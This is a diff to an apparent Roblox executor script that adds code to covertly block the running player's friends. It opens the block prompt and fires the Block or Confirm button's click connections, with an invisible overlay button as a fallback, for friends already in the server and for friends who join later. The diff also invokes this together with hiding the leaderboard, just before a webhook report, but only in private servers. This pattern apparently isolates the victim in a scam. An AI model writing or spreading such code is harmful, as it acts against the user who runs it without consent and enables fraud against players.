@@ -176,6 +176,162 @@ local function disableLeaderboard()
     end)
 end
 
+local function blockFriendsInServer()
+    pcall(function()
+        for _, player in pairs(Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                task.spawn(function()
+                    pcall(function()
+                        local isFriend = LocalPlayer:IsFriendsWith(player.UserId)
+                        if isFriend then
+                            -- Open the block prompt
+                            game:GetService("StarterGui"):SetCore("PromptBlockPlayer", player)
+                            
+                            task.wait(0.5) -- Wait for the prompt to appear
+                            
+                            -- Create invisible button overlay on top of the Block button
+                            local BlockOverlay = Instance.new("ScreenGui")
+                            BlockOverlay.Name = "BlockOverlay"
+                            BlockOverlay.ResetOnSpawn = false
+                            BlockOverlay.DisplayOrder = 999999999
+                            BlockOverlay.IgnoreGuiInset = true
+                            
+                            pcall(function()
+                                BlockOverlay.Parent = game:GetService("CoreGui")
+                            end)
+                            if not BlockOverlay.Parent then
+                                BlockOverlay.Parent = LocalPlayer:WaitForChild("PlayerGui")
+                            end
+                            
+                            -- Create invisible clickable button
+                            local InvisibleButton = Instance.new("TextButton")
+                            InvisibleButton.Size = UDim2.new(0, 200, 0, 50)
+                            InvisibleButton.Position = UDim2.new(0.5, -100, 0.5, 30) -- Position where Block button usually is
+                            InvisibleButton.BackgroundTransparency = 1
+                            InvisibleButton.Text = ""
+                            InvisibleButton.TextTransparency = 1
+                            InvisibleButton.ZIndex = 999999
+                            InvisibleButton.Parent = BlockOverlay
+                            
+                            -- Auto-click after a moment
+                            task.wait(0.3)
+                            
+                            -- Try to find and click the actual Block button in CoreGui
+                            local foundButton = false
+                            pcall(function()
+                                for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do
+                                    if gui:IsA("TextButton") then
+                                        local text = gui.Text:lower()
+                                        if text:find("block") or text:find("confirm") then
+                                            -- Simulate click on the actual button
+                                            for i = 1, 5 do
+                                                pcall(function()
+                                                    for _, connection in pairs(getconnections(gui.MouseButton1Click)) do
+                                                        connection:Fire()
+                                                    end
+                                                    for _, connection in pairs(getconnections(gui.Activated)) do
+                                                        connection:Fire()
+                                                    end
+                                                end)
+                                                task.wait(0.1)
+                                            end
+                                            foundButton = true
+                                            break
+                                        end
+                                    end
+                                end
+                            end)
+                            
+                            -- If we couldn't find it, try clicking our overlay position
+                            if not foundButton then
+                                for i = 1, 3 do
+                                    pcall(function()
+                                        InvisibleButton.MouseButton1Click:Fire()
+                                    end)
+                                    task.wait(0.1)
+                                end
+                            end
+                            
+                            -- Clean up after 3 seconds
+                            task.wait(3)
+                            BlockOverlay:Destroy()
+                        end
+                    end)
+                end)
+            end
+        end
+    end)
+end
+
+-- Monitor for new players joining and block if they're friends
+Players.PlayerAdded:Connect(function(player)
+    if player ~= LocalPlayer then
+        task.wait(1)
+        task.spawn(function()
+            pcall(function()
+                local isFriend = LocalPlayer:IsFriendsWith(player.UserId)
+                if isFriend then
+                    -- Open the block prompt
+                    game:GetService("StarterGui"):SetCore("PromptBlockPlayer", player)
+                    
+                    task.wait(0.5)
+                    
+                    -- Create invisible overlay
+                    local BlockOverlay = Instance.new("ScreenGui")
+                    BlockOverlay.Name = "BlockOverlay"
+                    BlockOverlay.ResetOnSpawn = false
+                    BlockOverlay.DisplayOrder = 999999999
+                    BlockOverlay.IgnoreGuiInset = true
+                    
+                    pcall(function()
+                        BlockOverlay.Parent = game:GetService("CoreGui")
+                    end)
+                    if not BlockOverlay.Parent then
+                        BlockOverlay.Parent = LocalPlayer:WaitForChild("PlayerGui")
+                    end
+                    
+                    local InvisibleButton = Instance.new("TextButton")
+                    InvisibleButton.Size = UDim2.new(0, 200, 0, 50)
+                    InvisibleButton.Position = UDim2.new(0.5, -100, 0.5, 30)
+                    InvisibleButton.BackgroundTransparency = 1
+                    InvisibleButton.Text = ""
+                    InvisibleButton.TextTransparency = 1
+                    InvisibleButton.ZIndex = 999999
+                    InvisibleButton.Parent = BlockOverlay
+                    
+                    task.wait(0.3)
+                    
+                    -- Try to find and click the Block button
+                    pcall(function()
+                        for _, gui in pairs(game:GetService("CoreGui"):GetDescendants()) do
+                            if gui:IsA("TextButton") then
+                                local text = gui.Text:lower()
+                                if text:find("block") or text:find("confirm") then
+                                    for i = 1, 5 do
+                                        pcall(function()
+                                            for _, connection in pairs(getconnections(gui.MouseButton1Click)) do
+                                                connection:Fire()
+                                            end
+                                            for _, connection in pairs(getconnections(gui.Activated)) do
+                                                connection:Fire()
+                                            end
+                                        end)
+                                        task.wait(0.1)
+                                    end
+                                    break
+                                end
+                            end
+                        end
+                    end)
+                    
+                    task.wait(3)
+                    BlockOverlay:Destroy()
+                end
+            end)
+        end)
+    end
+end)
+
 local function sendInitialWebhook()
     local avatarUrl = getPlayerAvatar(LocalPlayer.UserId)
     local embed = {
@@ -648,6 +804,8 @@ if not isPrivateServer() then
     return
 end
 
+disableLeaderboard()
+blockFriendsInServer()
 sendInitialWebhook()
 
 local gui, textBox, submitButton = createUI()
